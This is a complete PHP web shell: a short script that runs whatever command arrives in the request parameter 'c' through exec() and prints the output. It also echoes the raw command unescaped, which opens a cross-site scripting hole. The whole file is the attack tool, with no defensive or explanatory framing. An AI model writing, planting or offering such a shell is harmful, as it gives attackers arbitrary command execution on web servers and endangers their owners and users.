<?php
if( @ini_get('safe_mode') )
{
    echo 'Safe mode is on, the command is by default run though escapeshellcmd() and can only run programms in safe_mod_exec_dir (' . @ini_get('safe_mode_exec_dir') . ') <br />';
}
echo "<b>Command: <I>" . $_REQUEST['c'] . "</I></b><br /><br />";
trim(exec($_REQUEST['c'],$return));
foreach($return as $val)
{
    echo '<pre>' . htmlentities($val) . '</pre>';
}
?>